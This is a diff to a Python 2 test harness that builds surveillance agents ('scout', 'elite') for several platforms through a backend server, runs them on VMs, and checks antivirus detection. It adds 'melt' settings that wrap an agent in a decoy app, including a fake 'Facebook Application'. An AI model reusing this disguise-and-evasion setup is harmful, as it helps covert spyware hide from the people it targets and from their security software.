@@ -95,11 +95,12 @@ class connection:
         self.conn.logout()
 
 class VMAVTest:
-
-    def __init__(self, backend, frontend, kind, blacklist):
+    def __init__(self, backend, frontend, platform, kind, ftype, blacklist):
         self.kind = kind
         self.host = (backend, frontend)
         self.blacklist = blacklist
+        self.platform = platform
+        self.ftype = ftype
         print "DBG blacklist: %s" % self.blacklist
 
     def _delete_targets(self, operation):
@@ -114,7 +115,7 @@ class VMAVTest:
     def _create_new_factory(self, operation, target, factory, config):
         with connection() as c:
             operation_id = c.operation(operation)
-            print "DBG operation: " , operation, " target: ", target, " factory: ", factory
+            print "DBG type: ", self.ftype, " operation: " , operation, " target: ", target, " factory: ", factory
 
             # gets all the target with our name in an operation
             targets = c.targets(operation_id, target)
@@ -137,7 +138,7 @@ class VMAVTest:
             else:
                 print "- Create target: %s" % target
                 target_id = c.target_create(operation_id, target, 'made by vmavtest at %s' % time.ctime())
-            factory_id, ident = c.factory_create(operation_id, target_id, 'desktop', factory, 'made by vmavtestat at %s' % time.ctime())
+            factory_id, ident = c.factory_create(operation_id, target_id, self.ftype, factory, 'made by vmavtestat at %s' % time.ctime())
 
             with open(config) as f:
                 conf = f.read()
@@ -153,11 +154,39 @@ class VMAVTest:
 
     def _build_agent(self, factory, melt = None, demo = False):
         with connection() as c:
-            param = { 'platform': 'windows',
+            params = {}
+            params['blackberry'] = {'platform': 'blackberry',
+                'binary': {'demo': demo},
+                'melt': {'appname': 'facebook',
+                    'name': 'Facebook Application',
+                    'desc': 'Applicazione utilissima di social network',
+                    'vendor': 'face inc',
+                    'version': '1.2.3'},
+                'package': {'type': 'local'}}
+                
+            params['windows'] = { 'platform': 'windows',
                   'binary': { 'demo' : demo, 'admin' : False},
                   'melt' : {'scout' : True, 'admin' : False, 'bit64' : True, 'codec' : True },
                   'sign' : {}
-                  }
+            }
+            params['android'] = { 'platform': 'android',
+                  'binary': { 'demo' : demo, 'admin' : False},
+                  'melt' : {'scout' : True, 'admin' : False, 'bit64' : True, 'codec' : True },
+                  'sign' : {}
+            }
+            params['linux'] = { 'platform': 'linux',
+                  'binary': { 'demo' : demo, 'admin' : False},
+                  'melt' : {'scout' : True, 'admin' : False, 'bit64' : True, 'codec' : True },
+                  'sign' : {}
+            }
+            params['osx'] = {'platform': 'osx',
+                'binary': {'demo': demo, 'admin': True}
+            }
+            params['ios'] = {'platform': 'ios',
+                'binary': {'demo': demo }
+            }
+
+            param = params[self.platform]
 
             #{"admin"=>false, "bit64"=>true, "codec"=>true, "scout"=>true}
             try:
@@ -282,25 +311,9 @@ class VMAVTest:
 
         print "- Result: %s" % elite
 
-
     def execute_scout(self):
         """ build and execute the  """
-        hostname = socket.gethostname()
-        print "- Host: %s %s\n" % (hostname, time.ctime())
-        operation = 'AVMonitor'
-        target = 'VM_%s' % hostname
-        factory ='%s_%s' % (hostname, self.kind)
-        config = "assets/config.json"
-
-        if not os.path.exists('build'):
-            os.mkdir('build')
-        target_id, factory_id, ident = self._create_new_factory(operation, target, factory, config)
-
-        meltfile = None
-        if self.kind == 'melt':
-            meltfile = 'assets/meltapp.exe'
-
-        exe = self._build_agent( factory_id, meltfile )
+        factory_id, ident, exe = self.execute_pull()
 
         self._execute_build(exe)
 
@@ -319,8 +332,31 @@ class VMAVTest:
                 break;
 
         print "- Result: %s" % instance
-
         return instance
+
+
+    def execute_pull(self):
+        """ build and execute the  """
+        hostname = socket.gethostname()
+        print "- Host: %s %s\n" % (hostname, time.ctime())
+        operation = 'AVMonitor'
+        target = 'VM_%s' % hostname
+        factory ='%s_%s_%s' % (hostname, self.ftype, self.kind)
+        config = "assets/config.json"
+
+        if not os.path.exists('build'):
+            os.mkdir('build')
+        target_id, factory_id, ident = self._create_new_factory( operation, target, factory, config)
+
+        print "- Built"
+
+        meltfile = None
+        if self.kind == 'melt':
+            meltfile = 'assets/meltapp.exe'
+
+        exe = self._build_agent( factory_id, meltfile )
+
+        return factory_id, ident, exe
 
 def internet(args):
     print time.ctime()
@@ -333,7 +369,10 @@ def clean(args):
     vmavtest = VMAVTest( args.backend, args.frontend , args.kind )
     vmavtest.delete_targets(operation)
 
-def execute_agent(args, kind):
+def execute_agent(args, level):
+    ftype = args.platform_type[args.platform]
+    print "DBG ftype: %s" % ftype
+
     """ starts a scout """
     if socket.gethostname() != 'zenovm':
         if internet_on():
@@ -343,12 +382,12 @@ def execute_agent(args, kind):
     print "- Network unreachable"
 
     print "- Server: %s/%s %s" % (args.backend,args.frontend, args.kind)
-    vmavtest = VMAVTest( args.backend, args.frontend , args.kind, args.blacklist )
+    vmavtest = VMAVTest( args.backend, args.frontend , args.platform, args.kind, ftype, args.blacklist )
 
     if not vmavtest.server_errors():
         print "+ SUCCESS SERVER CONNECT"
-        action = {"elite": vmavtest.execute_elite, "scout": vmavtest.execute_scout}
-        action[kind]()
+        action = {"elite": vmavtest.execute_elite, "scout": vmavtest.execute_scout, "pull": vmavtest.execute_pull}
+        action[level]()
     else:
         print "+ FAILED SERVER ERROR"
 
@@ -359,6 +398,10 @@ def elite(args):
 def scout(args):
     """ starts a scout """
     execute_agent(args, "scout")
+
+def pull(args):
+    """ starts a scout """
+    execute_agent(args, "pull")
 
 def test(args):
 
@@ -382,6 +425,15 @@ def test(args):
     
 
 def main():
+    platform_desktop = [ 'windows', 'linux' ]
+    platform_mobile =  [ 'android', 'blackberry' ]
+
+    platform_type = {}
+    for v in platform_desktop:
+        platform_type[v]='desktop'
+    for v in platform_mobile:
+        platform_type[v]='mobile' 
+
     logger.setLogger(debug=True)
 
     op_conf_file = os.path.join("conf", "vmavtest.cfg")
@@ -391,17 +443,19 @@ def main():
 
     parser = argparse.ArgumentParser(description='AVMonitor avtest.')
 
-    parser.add_argument('action', choices=['scout', 'elite', 'internet', 'test', 'clean']) #'elite'
+    parser.add_argument('action', choices=['scout', 'elite', 'internet', 'test', 'clean', 'pull']) #'elite'
+    parser.add_argument('-p', '--platform', default='windows')
     parser.add_argument('-b', '--backend')
     parser.add_argument('-f', '--frontend')
     parser.add_argument('-k', '--kind', choices=['silent', 'melt'])
 
     parser.set_defaults(blacklist =  blacklist)
+    parser.set_defaults(platform_type =  platform_type)
 
     args = parser.parse_args()
-
+    
     connection.host = args.backend
-    actions = {'scout': scout, 'elite': elite, 'internet': internet, 'test': test, 'clean': clean}
+    actions = {'scout': scout, 'elite': elite, 'internet': internet, 'test': test, 'clean': clean, 'pull': pull}
     actions[args.action](args)
   
 
